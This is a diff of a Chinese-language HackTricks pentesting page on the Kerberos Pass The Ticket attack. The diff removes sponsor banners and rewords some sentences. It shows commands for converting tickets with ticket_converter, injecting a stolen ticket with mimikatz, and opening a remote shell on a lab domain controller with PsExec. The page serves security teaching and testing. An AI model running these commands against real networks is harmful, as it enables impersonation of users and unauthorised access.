@@ -2,26 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
-立即获取访问权限：
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
-
 ## Pass The Ticket (PTT)
 
-在 **Pass The Ticket (PTT)** 攻击方法中，攻击者 **窃取用户的认证票证**，而不是他们的密码或哈希值。然后使用这个被窃取的票证来 **冒充用户**，获得对网络内资源和服务的未经授权访问。
+在**Pass The Ticket (PTT)**攻击方法中，攻击者**窃取用户的认证票证**，而不是他们的密码或哈希值。这个被窃取的票证随后被用来**冒充用户**，从而获得对网络内资源和服务的未授权访问。
 
 **阅读**：
 
-- [从 Windows 收集票证](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
-- [从 Linux 收集票证](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
+- [从Windows中收集票证](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
+- [从Linux中收集票证](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **在平台之间交换 Linux 和 Windows 票证**
+### **在平台之间交换Linux和Windows票证**
 
-[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) 工具仅使用票证本身和输出文件来转换票证格式。
+[**ticket_converter**](https://github.com/Zer1t0/ticket_converter)工具仅使用票证本身和输出文件来转换票证格式。
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -44,16 +36,8 @@ mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.k
 klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
-## 参考文献
+## 参考
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
-立即获取访问权限：
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
 {{#include ../../banners/hacktricks-training.md}}
